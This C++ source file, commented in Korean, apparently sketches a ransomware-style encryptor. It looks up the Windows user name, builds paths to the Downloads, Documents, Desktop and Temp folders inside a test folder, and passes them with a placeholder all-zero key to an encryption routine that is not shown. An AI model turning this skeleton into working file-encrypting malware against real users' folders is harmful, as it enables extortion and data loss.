#include <iostream>
#include <fstream>
#include <time.h>
#include <ctime>
#include <windows.h>
#include "FileEncrypt.hpp"
#include "FileAnalysis.hpp"

using namespace std;


void filebyte(const char* path)
{
    // 경로를 지정해서 파일을 바이너리모드로 열음 
    ifstream file(path, ios::binary);

    // 파일 검사 
    if (!file.is_open()) {
        cout << "파일을 열 수 없습니다." << endl;
        return;
    }

    // 버퍼를 만들어 4byte 읽기 
    char buffer[4] = { 0, };
    file.read(buffer, 4);

    // 시그니처 출력하는 공간 
    for (int i = 0; i < size(buffer); i++) {
        /*
            hex는 char형 으로 처리해야함
            unsigned char형은 16진수를 표현할 때 127 이상의 수를 표현 할 수 없기 때문에  -128 음수가 나오기 때문에 FFFFFF가 출력이 됨
        */
        cout << hex << ((unsigned int)(unsigned char)buffer[i]);
    }
    cout << endl;

    file.close();

}



int main()
{
    DWORD username_len = UNLEN + 1;
    char userName[UNLEN + 1];
    string filename = "C:\\Users";
    string downloadname, documentsname, desktopname, foldername;

    // 사용자 이름 알아내기
    GetUserNameA(userName, &username_len);
    cout << "username: " << userName << endl;
    cout << endl;
    string userNameStr(userName);

    // 암호화 키 생성 
    unsigned char key[32] = {0x00,}; //generateKey();

    // 디렉토리 탐색
    downloadname = filename + "\\" + userName + "\\test_folder" + "\\Downloads";
    documentsname = filename + "\\" + userName + "\\test_folder" + "\\Documents";
    desktopname = filename + "\\" + userName + "\\test_folder" + "\\Desktop";
    foldername = filename + "\\" + userName + "\\test_folder" + "\\AppData\\Local\\Temp";

    cout << downloadname << endl;
    cout << documentsname << endl;
    cout << desktopname << endl;
    cout << foldername << endl;
    cout << endl;
    cout << endl;

    // 파일 탐색
    FileRead(key, downloadname);
    // FileRead(key, documentsname);
    // FileRead(key, desktopname);
    // FileRead(key, foldername);

    cryptoTest();

    return 0;
    

}
